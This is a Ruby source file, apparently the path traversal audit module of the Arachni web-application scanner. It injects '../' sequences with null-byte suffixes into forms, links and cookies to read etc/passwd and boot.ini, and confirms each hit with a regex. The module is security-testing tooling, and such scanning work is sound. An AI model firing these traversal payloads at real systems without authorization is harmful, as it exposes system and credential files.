=begin
                  Arachni
  Copyright (c) 2010 Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>

  This is free software; you can copy and distribute and modify
  this program under the term of the GPL v2.0 License
  (See LICENSE file for details)

=end

module Arachni

module Modules

#
# Path Traversal audit module.
#
# @author: Tasos "Zapotek" Laskos
#                                      <tasos.laskos@gmail.com>
#                                      <zapotek@segfault.gr>
# @version: 0.2.1
#
# @see http://cwe.mitre.org/data/definitions/22.html
# @see http://www.owasp.org/index.php/Path_Traversal
# @see http://projects.webappsec.org/Path-Traversal
#
class PathTraversal < Arachni::Module::Base

    def initialize( page )
        super( page )

        @results    = []
    end

    def prepare( )

        #
        # the way this works is pretty cool since it will actually
        # exploit the vulnerability in order to verify that it worked
        # which also means that the results of the exploitation will
        # appear in the report.
        #
        # *but* we may run into a web page that details the structure of
        # the 'passwd' file and get a false positive; so we need to check
        # the html code in @page.html before checking the responses of the audit
        # and give accurate feedback about the context in which the vulnerability
        # was flagged.
        #


        @__trv =  '../../../../../../../../../../../../../../../../'
        @__ext = [
            "",
            "\0.htm",
            "\0.html",
            "\0.asp",
            "\0.aspx",
            "\0.php",
            "\0.txt",
            "\0.gif",
            "\0.jpg",
            "\0.jpeg",
            "\0.png",
            "\0.css"
        ]

        @__params = [
            {
                'value'  => 'etc/passwd',
                'regexp' => /\w+:.+:[0-9]+:[0-9]+:.+:[0-9a-zA-Z\/]+/i
            },
            {
                'value'  => 'boot.ini',
                'regexp' => /\[boot loader\](.*)\[operating systems\]/i
            }

        ]

        @__opts = {
            # we don't want the Auditor to interfere with our injecion strings
            :format => [ Format::STRAIGHT ],
        }

    end

    def run( )

        @__params.each {
            |param|

            @__opts[:regexp] = param['regexp']
            @__ext.each {
                |ext|

                injection_str = @__trv + param['value'] + ext
                audit( injection_str, @__opts )
            }
        }
    end


    def self.info
        {
            :name           => 'PathTraversal',
            :description    => %q{Path Traversal module.},
            :elements       => [
                Vulnerability::Element::FORM,
                Vulnerability::Element::LINK,
                Vulnerability::Element::COOKIE
            ],
            :author         => 'zapotek',
            :version        => '0.2.1',
            :references     => {
                'OWASP' => 'http://www.owasp.org/index.php/Path_Traversal',
                'WASC'  => 'http://projects.webappsec.org/Path-Traversal'
            },
            :targets        => { 'Generic' => 'all' },

            :vulnerability   => {
                :name        => %q{Path Traversal},
                :description => %q{Improper limitation of a pathname to a restricted directory.},
                :cwe         => '22',
                :severity    => Vulnerability::Severity::MEDIUM,
                :cvssv2       => '4.3',
                :remedy_guidance    => '',
                :remedy_code => '',
                :metasploitable => 'unix/webapp/arachni_path_traversal'
            }

        }
    end

end
end
end
